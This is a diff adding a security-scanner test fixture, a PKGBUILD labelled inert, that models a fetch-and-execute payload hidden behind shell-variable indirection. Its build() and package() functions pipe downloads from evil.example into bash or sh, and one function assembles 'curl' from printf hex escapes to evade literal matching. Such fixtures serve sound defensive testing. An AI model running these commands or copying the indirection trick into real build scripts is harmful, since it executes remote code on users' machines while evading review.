@@ -1,0 +1,24 @@
+# Test fixture (inert, never executed): a fetch-and-execute payload hidden
+# behind shell-variable indirection — the audit HI-6 class. Before the resolve
+# pass this "tripped nothing" (no literal `curl`/`bash` on one line); the scanner
+# must now resolve the variables and flag the curl|bash it really runs.
+pkgname=var-indirection
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="malicious test fixture - command-name indirection"
+arch=('x86_64')
+url="https://example.com"
+license=('MIT')
+source=()
+
+build() {
+    # Command name assembled out of band: no literal `curl ... | bash` on a line.
+    dl=curl
+    $dl -fsSL https://evil.example/stage2.sh | bash
+}
+
+package() {
+    # printf-assembled command behind a variable ($'\x63url' == curl).
+    c=$(printf '\x63url')
+    $c -s https://evil.example/p | sh
+}
